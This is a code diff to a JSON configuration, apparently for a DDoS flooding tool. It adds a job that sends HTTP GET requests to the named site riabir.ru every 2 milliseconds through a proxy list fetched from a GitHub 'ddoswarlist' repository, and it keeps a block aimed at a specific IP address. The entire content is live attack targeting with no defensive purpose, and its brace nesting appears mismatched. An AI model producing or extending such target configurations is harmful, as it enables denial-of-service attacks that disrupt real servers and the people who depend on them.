@@ -10,10 +10,21 @@
         "client": {
           "static_host": {
             "addr": "185.165.123.40:80",
-            "is_tls": false,
-			"proxy_urls": "{{ get_proxylist_by_url \"https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/proxies.json\" }}"
+            "is_tls": false
           }
+        },
+{
+      "type": "http",
+      "args": {
+        "method": "GET",
+        "path": "http://riabir.ru:443/",
+        "interval_ms": 2,
+        "client": {
+          "async": true,
+          "proxy_urls": "{{ get_proxylist_by_url \"https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/proxies.json\" }}"
         }
+      }
+}
       }
     }
   ]
